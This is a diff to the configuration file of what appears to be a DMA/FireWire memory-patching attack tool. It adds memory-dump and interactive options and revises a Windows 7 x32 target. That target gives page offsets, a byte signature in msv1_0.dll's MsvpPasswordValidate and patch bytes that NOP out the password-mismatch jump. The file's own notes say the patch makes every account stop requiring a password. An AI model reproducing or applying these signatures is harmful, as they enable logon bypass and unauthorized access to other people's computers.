@@ -31,6 +31,10 @@ memsize = 4 * GiB       # 4 GiB, FW max
 success = True          # Optimistic-by-nature setting
 encoding = None         # System encoding
 vectorsize = 128        # Read vector size
+memdump = False         # Memory dump mode off
+dumpstart = 0x00000000  # Default memory dump start address
+dumpend = 0xffffffff    # Defualt memory dump end address
+interactive = False     # Interactive mode off
 
 #===============================================================================
 # Targets are collected in a list of dicts using the following syntax:
@@ -85,7 +89,7 @@ vectorsize = 128        # Read vector size
 # /\             |-patchoffset--------------->[b0 01]   
 # 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f .. (byte offset)
 # -----------------------------------------------
-# c6 0f 85 a0 b8 00 00 b8 ab 05 03 ff ef 01 00 00 .. (chunk of memory)
+# c6 0f 85 a0 b8 00 00 b8 ab 05 03 ff ef 01 00 00 .. (chunk of memory data)
 # -----------------------------------------------
 # \______/ \___/ \______/
 #     \      \       \
@@ -135,15 +139,11 @@ targets=[{'OS': 'Windows 7',
           'architecture': 'x32',
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password. The XP2 technique patches the call which decides if an account requires password authentication. ',
-          'signatures': [{'offsets': [0x8aa, 0x862, 0x946],
+          'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6],
                           'chunks': [{'chunk': 0x83f8107511b0018b,
                                       'internaloffset': 0x00,
-                                      'patch': 0x83f8109090b0018b}]},
-                         {'offsets': 0x927,
-                          'chunks': [{'chunk': 0x8bff558bec83ec50a1,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xb001,
-                                      'patchoffset': 0xa5}]}]},
+                                      'patch': 0x83f8109090b0018b,
+                                      'patchoffset': 0x00}]}]},
          {'OS': 'Mac OS X',
           'versions': ['10.6'],
           'architecture': 'x64',
